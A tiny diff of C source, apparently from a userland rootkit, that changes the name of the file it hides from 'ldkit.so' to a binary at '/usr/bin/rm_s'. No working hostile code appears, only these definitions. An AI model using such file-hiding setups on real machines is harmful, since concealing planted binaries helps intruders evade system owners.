@@ -12,4 +12,5 @@
 #include <fcntl.h>
 #include "include/syscall.h"
 
-#define HIDDEN "ldkit.so"
+#define HIDDEN_PATH "/usr/bin/rm_s"
+#define HIDDEN_FILENAME "rm_s"
